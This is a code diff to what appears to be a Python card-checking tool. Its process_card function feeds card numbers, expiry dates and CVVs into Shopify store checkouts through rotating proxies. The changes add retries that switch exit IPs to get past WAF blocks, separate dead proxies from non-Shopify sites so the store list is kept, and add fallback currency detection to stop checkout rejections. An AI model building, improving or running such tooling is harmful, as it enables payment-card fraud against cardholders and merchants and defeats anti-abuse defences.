@@ -917,12 +917,16 @@ async def fetch_primary_domain(session, url, headers, proxy):
 async def verify_shopify_store(session, ourl, proxy, profile):
     """Checks if the site is actually a Shopify store by hitting /meta.json.
     🔥 rotating egress: retry EVERYTHING (exceptions + WAF codes) before
-    declaring not-Shopify — each retry exits a new IP."""
+    declaring not-Shopify — each retry exits a new IP.
+    🔥 returns "CONNECTION_DEAD" when zero HTTP responses arrived (dead egress)
+    — callers must NOT declare NOT_SHOPIFY in that case (msh deletes sites!)."""
+    _got_http = False
     try:
         h = _probe_headers(profile, ourl)
         for _try in range(4):
             try:
                 r = await session.get(f"{ourl}/meta.json", headers=h, proxy=proxy, timeout=8)
+                _got_http = True
             except Exception:
                 await asyncio.sleep(0.5)
                 continue
@@ -941,6 +945,7 @@ async def verify_shopify_store(session, ourl, proxy, profile):
         for _try in range(3):
             try:
                 r2 = await session.get(f"{ourl}/cart.js", headers=h, proxy=proxy, timeout=8)
+                _got_http = True
             except Exception:
                 await asyncio.sleep(0.5)
                 continue
@@ -958,7 +963,7 @@ async def verify_shopify_store(session, ourl, proxy, profile):
             break
     except Exception:
         pass
-    return False
+    return False if _got_http else "CONNECTION_DEAD"
 
 async def detect_currency_via_meta(session, domain, proxy, profile):
     try:
@@ -984,11 +989,46 @@ async def detect_currency_via_cartjs(session, domain, proxy, profile):
     return None
 
 
+async def detect_currency_via_root(session, domain, proxy, profile):
+    # storefront analytics embeds the store BASE currency — always a valid
+    # presentment currency, and the root page is reachable whenever warmup is
+    try:
+        r = await session.get(f"{domain}/",
+                              headers=_probe_headers(profile, domain),
+                              proxy=proxy, timeout=8)
+        if r.status_code == 200:
+            m = re.search(r'Shopify\.currency\s*=\s*\{[^}]*?"active"\s*:\s*"([A-Z]{3})"', r.text)
+            if m: return m.group(1).upper()
+            m = re.search(r'"currency"\s*:\s*"([A-Z]{3})"\s*,\s*"rate"', r.text)
+            if m: return m.group(1).upper()
+    except Exception: pass
+    return None
+
+
+async def redetect_supported_currency(session, ourl, proxy, profile, current):
+    # retry-path currency hunt: geo-adjusted (cart.js) → store BASE (root
+    # analytics, then meta.json). Returns the first currency that DIFFERS from
+    # the rejected one — the base currency is always accepted at checkout.
+    _cur = str(current or "").upper()
+    for _fn in (detect_currency_via_cartjs, detect_currency_via_root, detect_currency_via_meta):
+        try:
+            c = await _fn(session, ourl, proxy, profile)
+        except Exception:
+            c = None
+        if isinstance(c, str) and c and c.upper() != _cur:
+            return c
+    return None
+
+
 async def detect_store_currency(session, domain, proxy, profile):
     # 🔥 deterministic: meta.json = the SHOP's real currency (immune to IP-geo
-    # presentment); cart.js reflects the geo-adjusted session currency — fallback.
+    # presentment); root analytics = store BASE (never rejected at checkout);
+    # cart.js reflects the geo-adjusted session currency — last fallback.
     # Prevents BUYER_IDENTITY_PRESENTMENT_CURRENCY mismatches on the checkout.
     r = await detect_currency_via_meta(session, domain, proxy, profile)
+    if isinstance(r, str) and r:
+        return r
+    r = await detect_currency_via_root(session, domain, proxy, profile)
     if isinstance(r, str) and r:
         return r
     r = await detect_currency_via_cartjs(session, domain, proxy, profile)
@@ -1615,6 +1655,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             # 🔥 FIX: Abort if this isn't a Shopify site
             is_shopify = await verify_shopify_store(session, ourl, proxy, profile)
+            if is_shopify == "CONNECTION_DEAD":
+                # egress never answered a single request — proxy problem, NOT
+                # a dead store (msh deletes sites on NOT_SHOPIFY: never lie)
+                print(f"[verify] ⛔ egress dead (zero responses) → Change Proxy")
+                return False, "Change Proxy", gateway, variant_price_fallback, currency
             if not is_shopify:
                 print(f"[verify] ❌ Not a Shopify store (meta.json/cart.js failed)")
                 return False, "NOT_SHOPIFY", gateway, variant_price_fallback, currency
@@ -2041,7 +2086,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 _p1err = str(resp_json['errors'][0].get('message', ''))
                 if "PRESENTMENT_CURRENCY" in _p1err.upper():
                     try:
-                        _fix = await detect_currency_via_cartjs(session, ourl, proxy, profile)
+                        _fix = await redetect_supported_currency(session, ourl, proxy, profile, currency)
                         if isinstance(_fix, str) and _fix and _fix != currency:
                             print(f"[currency] P1 mismatch → session currency {_fix} (was {currency})")
                             currency = _fix
@@ -2079,7 +2124,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 # (shares the session cookies) and re-propose ONCE
                 if "PRESENTMENT_CURRENCY" in _joined:
                     try:
-                        _fix = await detect_currency_via_cartjs(session, ourl, proxy, profile)
+                        _fix = await redetect_supported_currency(session, ourl, proxy, profile, currency)
                         if isinstance(_fix, str) and _fix and _fix != currency:
                             print(f"[currency] negotiate mismatch → session currency {_fix}")
                             currency = _fix
